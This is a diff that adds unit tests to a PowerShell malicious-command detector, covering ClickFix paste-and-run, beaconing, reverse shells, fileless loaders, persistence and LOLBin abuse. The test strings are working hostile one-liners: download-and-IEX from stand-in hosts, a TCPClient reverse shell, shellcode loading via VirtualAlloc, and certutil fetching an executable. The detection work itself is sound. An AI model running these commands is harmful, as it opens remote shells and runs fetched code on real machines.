@@ -92,3 +92,49 @@ describe('AMSI / ETW / Defender tampering', () => {
     expect(s.find((x) => x.id === 'etw-tamper')?.specificity).toBe('strong')
   })
 })
+
+describe('ClickFix / paste-and-run', () => {
+  it('fires on a hidden-window one-liner that fetches and IEXes', () => {
+    const raw = "powershell -nop -w hidden -c IEX (iwr http://evil.test/x).Content"
+    expect(ids('IEX (iwr http://evil.test/x).Content', raw)).toContain('clickfix')
+  })
+  it('fires on conhost --headless powershell', () => {
+    expect(ids("conhost --headless powershell -nop -c iex(irm http://x.test/a)"))
+      .toContain('clickfix')
+  })
+  it('benign twin: a plain hidden -File task does NOT fire', () => {
+    const raw = "powershell -w hidden -nop -File C:\\ops\\job.ps1"
+    expect(ids('Get-Date', raw)).not.toContain('clickfix')
+  })
+})
+
+describe('beaconing + reverse shell + loaders + persistence', () => {
+  it('beaconing: jittered sleep loop + same-host fetch', () => {
+    expect(ids("while($true){ Start-Sleep (Get-Random -Min 30 -Max 90); IEX (New-Object Net.WebClient).DownloadString('http://c2.test/t') }"))
+      .toContain('beaconing')
+  })
+  it('reverse-shell: TCPClient stream feeding IEX is near-dispositive', () => {
+    const s = analyze("$c=New-Object Net.Sockets.TCPClient('10.0.0.5',4444);$s=$c.GetStream();IEX $data")
+    expect(s.find((x) => x.id === 'reverse-shell')?.specificity).toBe('near-dispositive')
+  })
+  it('fileless-loader: VirtualAlloc + CreateThread on a byte array', () => {
+    expect(ids("$b=[byte[]](0x90,0x90); $a=VirtualAlloc 0 $b.Length 0x3000 0x40; CreateThread 0 0 $a 0 0 0"))
+      .toContain('fileless-loader')
+  })
+  it('persistence: Register-ScheduledTask fires (strong)', () => {
+    const s = analyze("Register-ScheduledTask -TaskName Updater -Action $a -Trigger $t")
+    expect(s.find((x) => x.id === 'persistence')?.specificity).toBe('strong')
+  })
+  it('benign twin: a bare Start-Sleep with no loop/fetch is not beaconing', () => {
+    expect(ids("Start-Sleep -Seconds 5")).not.toContain('beaconing')
+  })
+})
+
+describe('LOLBin surfaces through classify', () => {
+  it('emits a lolbin signal naming the binary', () => {
+    const s = analyze("certutil.exe -urlcache -split -f http://45.9.148.20/a.exe a.exe")
+    const l = s.find((x) => x.id === 'lolbin')
+    expect(l).toBeTruthy()
+    expect(l!.label.toLowerCase()).toContain('certutil')
+  })
+})
